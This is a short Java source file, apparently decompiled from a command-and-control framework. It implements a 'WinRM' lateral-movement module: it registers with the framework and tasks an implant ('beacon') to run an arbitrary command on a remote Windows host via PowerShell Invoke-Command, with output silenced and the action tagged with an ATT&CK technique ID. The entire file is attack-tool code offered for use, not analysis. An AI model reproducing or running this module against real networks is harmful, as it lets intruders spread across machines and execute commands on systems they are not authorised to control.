package beacon.methods;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExecMethods;
import beacon.TaskBeacon;

public class WinRM implements BeaconRemoteExecMethods.RemoteExecMethod {
   protected AggressorClient client;

   public WinRM(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconRemoteExecMethods(var1.getData()).register("winrm", "Remote execute via WinRM (PowerShell)", this);
   }

   public void remoteexec(String var1, String var2, String var3) {
      TaskBeacon var4 = new TaskBeacon(this.client, new String[]{var1});
      var4.log_task(var1, "Tasked beacon to run '" + var3 + "' on " + var2 + " via WinRM", "T1028");
      var4.silent();
      var4.PowerShellNoImport("Invoke-Command -ComputerName " + var2 + " -ScriptBlock { " + var3 + " }");
   }
}
